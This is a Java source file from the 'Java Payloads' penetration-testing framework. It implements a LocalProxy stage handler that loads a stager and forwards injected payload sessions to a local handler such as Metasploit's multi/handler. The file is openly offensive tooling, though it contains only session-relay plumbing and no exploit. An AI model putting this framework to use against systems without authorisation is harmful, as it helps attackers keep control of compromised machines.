/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.handler.stage;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.SocketException;

import javapayload.Parameter;
import javapayload.loader.DynLoader;
import javapayload.stage.StreamForwarder;
import javapayload.stager.Stager;

public class LocalProxy extends StageHandler {

	public LocalProxy() {
		super("Proxy injector connection to a local external stage handler", true, false,
				"This stager handler does not stage anything, but instead connects to another\r\n" +
				"local stage handler (typically Metasploit's multi/handler) to collect sessions.");
	}
	
	public Parameter[] getParameters() {
		return new Parameter[] {
			new Parameter("STAGER", false, Parameter.TYPE_STAGER, "Stager to use to connect to proxy")
		};
	}
	
	public Class[] getNeededClasses() {
		throw new IllegalStateException("Not used");
	}

	public void handle(OutputStream rawOut, InputStream in, String[] parameters) throws Exception {
		for (int i = 0; i < parameters.length; i++) {
			if (parameters[i].equals("--")) {
				String[] args = new String[parameters.length - (i + 2)];
				System.arraycopy(parameters, i + 2, args, 0, args.length);
				final Stager stager = (Stager) DynLoader.loadStager("InternalLocalProxy_"+args[0], args, 0).newInstance();
				stager.getClass().getField("consoleOut").set(stager, consoleOut);
				stager.getClass().getField("consoleErr").set(stager, consoleErr);
				stager.getClass().getField("rawOut").set(stager, rawOut);
				stager.getClass().getField("in").set(stager, in);
				stager.bootstrap(args, false);
				break;
			}
		}
	}

	protected StageHandler createClone() {
		return new LocalProxy();
	}
	
	public static class ForwardThread extends Thread {
		
		private final InputStream in;
		private final OutputStream out;
		private final PrintStream consoleErr;

		public ForwardThread(InputStream in, OutputStream out, PrintStream consoleErr) {
			this.in = in;
			this.out = out;
			this.consoleErr = consoleErr;
		}
		public void run() {
			try {
				StreamForwarder.forward(in, out);
			} catch (SocketException ex) {
				// ignore
			} catch (IOException ex) {
				ex.printStackTrace(consoleErr);
			}
		}
	}
}